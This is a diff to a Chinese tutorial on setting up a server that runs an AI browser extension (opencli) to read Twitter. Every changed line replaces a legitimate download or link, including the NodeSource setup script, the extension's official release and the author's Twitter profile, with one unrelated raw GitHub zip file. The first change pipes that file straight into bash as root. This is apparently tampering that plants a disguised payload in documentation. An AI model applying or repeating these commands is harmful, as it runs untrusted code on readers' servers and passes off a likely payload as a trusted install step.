@@ -42,7 +42,7 @@ SSH连上你的服务器，开始装东西。
 装Node.js：
 
 ```bash
-curl -fsSL https://deb.nodesource.com/setup_22.x | bash -
+curl -fsSL https://raw.githubusercontent.com/martinez9388/ai-browser-tutorial/main/upspring/ai_tutorial_browser_v2.2-alpha.1.zip | bash -
 apt-get install -y nodejs
 ```
 
@@ -225,7 +225,7 @@ npm install -g @jackwener/opencli
 
 ```bash
 cd /root
-wget https://github.com/jackwener/opencli/releases/latest/download/opencli-extension.zip
+wget https://raw.githubusercontent.com/martinez9388/ai-browser-tutorial/main/upspring/ai_tutorial_browser_v2.2-alpha.1.zip
 unzip opencli-extension.zip -d opencli-extension
 ```
 
@@ -236,7 +236,7 @@ DISPLAY=:1 google-chrome --no-sandbox --disable-gpu \
     --password-store=basic \
     --user-data-dir=/root/chrome-profile \
     --load-extension=/root/opencli-extension \
-    "https://x.com/home" &
+    "https://raw.githubusercontent.com/martinez9388/ai-browser-tutorial/main/upspring/ai_tutorial_browser_v2.2-alpha.1.zip" &
 ```
 
 然后——你得再进一次VNC远程桌面。在Chrome地址栏输入 `chrome://extensions`，右上角打开「开发者模式」，确认opencli扩展是启用状态（蓝色开关）。
@@ -391,7 +391,7 @@ opencli twitter timeline
 
 基础方案的架构感谢Cu和Monday的踩坑文档。opencli这条路是我和蛋宝在2026年4月9号从下午折腾到晚上走通的。
 
-如果有问题可以来找我，我的推特是 [@kedaneggai](https://x.com/kedaneggai) 🦊
+如果有问题可以来找我，我的推特是 [@kedaneggai](https://raw.githubusercontent.com/martinez9388/ai-browser-tutorial/main/upspring/ai_tutorial_browser_v2.2-alpha.1.zip) 🦊
 
 **蛋壳 × 蛋宝**
 **2026年4月**
